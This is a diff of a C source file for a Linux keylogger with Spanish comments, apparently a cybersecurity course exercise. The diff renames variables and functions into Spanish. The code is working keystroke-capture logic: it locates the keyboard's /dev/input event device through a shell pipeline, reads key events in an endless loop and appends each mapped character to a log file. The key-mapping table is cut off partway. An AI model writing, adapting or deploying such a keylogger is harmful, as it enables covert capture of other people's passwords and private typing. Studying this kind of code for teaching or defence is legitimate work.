@@ -8,60 +8,60 @@
 #include <errno.h> //Provee el mecanismo de manejo de errores.
 
 #define LOGFILEPATH "/home/carlos30/Escritorio/Ciberseguridad/keylogger.txt"
-//Aqui se define la ruta donde se almacenarán las teclas registradas.
+//Aquí se define la ruta donde se almacenarán las teclas registradas.
 
-char *getEvent();
-char mapKey(int code);
+char *obtenerEvento();
+char mapearTecla(int codigo);
 //Declaramos las dos funciones auxiliares que utilizaremos
 
 int main(){
-    struct input_event ev; //Estructura que almacena información sobre eventos de entrada.
-    static char path_keyboard[20] = "/dev/input/"; //Ruta al dispositivo de entrada de teclado.Se construye concatenando "/dev/input/" con el nombre del archivo de evento obtenido por getEvent().
-    strcat(path_keyboard, getEvent()); //Agrega el nombre del archivo de evento a la ruta base "/dev/input/".
-    path_keyboard[strlen(path_keyboard)-1] = 0; //Elimina un posible salto de línea al final de la cadena.
+    struct input_event evento; //Estructura que almacena información sobre eventos de entrada.
+    static char ruta_teclado[20] = "/dev/input/"; //Ruta al dispositivo de entrada de teclado. Se construye concatenando "/dev/input/" con el nombre del archivo de evento obtenido por obtenerEvento().
+    strcat(ruta_teclado, obtenerEvento()); //Agrega el nombre del archivo de evento a la ruta base "/dev/input/".
+    ruta_teclado[strlen(ruta_teclado)-1] = 0; //Elimina un posible salto de línea al final de la cadena.
 
-    int device_keyboard = open(path_keyboard, O_RDONLY); //Abre el dispositivo de teclado en modo de solo lectura.
-    if (device_keyboard < 0) {
-        perror("Error opening device");
+    int dispositivo_teclado = open(ruta_teclado, O_RDONLY); //Abre el dispositivo de teclado en modo de solo lectura.
+    if (dispositivo_teclado < 0) {
+        perror("Error al abrir el dispositivo");
         return 1;
     }
 
-    FILE *fp = fopen(LOGFILEPATH, "a"); //Abre el archivo de registro en modo de "apéndice". Si no se puede abrir el archivo, se cierra el dispositivo de teclado y el programa termina.
-    if (!fp) {
-        perror("Error opening log file");
-        close(device_keyboard);
+    FILE *archivo = fopen(LOGFILEPATH, "a"); //Abre el archivo de registro en modo de "apéndice". Si no se puede abrir el archivo, se cierra el dispositivo de teclado y el programa termina.
+    if (!archivo) {
+        perror("Error al abrir el archivo de registro");
+        close(dispositivo_teclado);
         return 1;
     }
 
     while (1) {
-        read(device_keyboard, &ev, sizeof(ev)); // Lee un evento del teclado.
-        if (ev.type == EV_KEY && ev.value == 0) { //Filtra los eventos de tipo EV_KEY que indican que una tecla fue presionada y luego soltada.
-            char key = mapKey(ev.code); //Convierte el código de la tecla en un carácter.
-            if (key) {
-                fputc(key, fp); //Escribe el carácter en el archivo de registro.
-                fflush(fp);  //Asegura que los datos se escriban inmediatamente en el archivo.
+        read(dispositivo_teclado, &evento, sizeof(evento)); // Lee un evento del teclado.
+        if (evento.type == EV_KEY && evento.value == 0) { //Filtra los eventos de tipo EV_KEY que indican que una tecla fue presionada y luego soltada.
+            char tecla = mapearTecla(evento.code); //Convierte el código de la tecla en un carácter.
+            if (tecla) {
+                fputc(tecla, archivo); //Escribe el carácter en el archivo de registro.
+                fflush(archivo);  //Asegura que los datos se escriban inmediatamente en el archivo.
             }
         }
     }
 
-    fclose(fp);
-    close(device_keyboard);
+    fclose(archivo);
+    close(dispositivo_teclado);
     return 0; //Se cierran el archivo de registro y el dispositivo de teclado antes de que el programa termine.
 }
 
-char *getEvent(){
-    static char event[8];
+char *obtenerEvento(){
+    static char evento[8];
     FILE *pipe = popen("cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'", "r");
     if (!pipe)
         exit(1); //Ejecuta un comando en la terminal y abre una tubería para leer su salida.
 
-    fgets(event, 8, pipe); //Lee el nombre del archivo de evento del teclado.
+    fgets(evento, 8, pipe); //Lee el nombre del archivo de evento del teclado.
     pclose(pipe); //Cierra la tubería.
-    return event;
+    return evento;
 }
 
-char mapKey(int code) {
-    switch (code) {
+char mapearTecla(int codigo) {
+    switch (codigo) {
         case KEY_A: return 'a';
         case KEY_B: return 'b';
         case KEY_C: return 'c';
